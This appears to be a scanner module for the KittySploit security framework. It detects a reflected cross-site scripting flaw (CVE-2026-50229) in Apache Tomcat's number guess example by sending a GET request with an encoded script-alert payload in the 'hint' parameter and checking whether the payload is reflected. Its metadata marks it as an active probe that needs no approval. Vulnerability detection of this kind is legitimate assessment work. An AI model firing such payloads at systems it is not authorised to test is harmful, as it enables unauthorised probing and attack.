#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) vulnerability in the number gues."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Tomcat - Cross-Site Scripting Detection',
        'description': 'Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) vulnerability in the number guess example for Apache Tomcat. This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.22, from 10.1.0-M1 through 10.1.55, from 9.0.0.M1 through 9.0.118, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109. Other versions that have reached end of support may also be affected. Users are recommended to upgrade to version 11.0.23, 10.1.56 or 9.0.119, which fix the issue.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'apache', 'tomcat', 'xss'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://lists.apache.org/thread/wlt2no8bw45zl1w8byop4zfqphldf5j0',
            'https://www.cve.org/CVERecord?id=CVE-2026-50229',
            'https://tomcat.apache.org/security-11.html',
            'https://www.herodevs.com/vulnerability-directory/cve-2026-50229',
        ],
        'cve': 'CVE-2026-50229',
    }

    def run(self):
        path = '/examples/jsp/num/numguess.jsp?guess=5&hint=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('<script>alert(document.domain)</script>', 'Number Guess',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Apache Tomcat - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

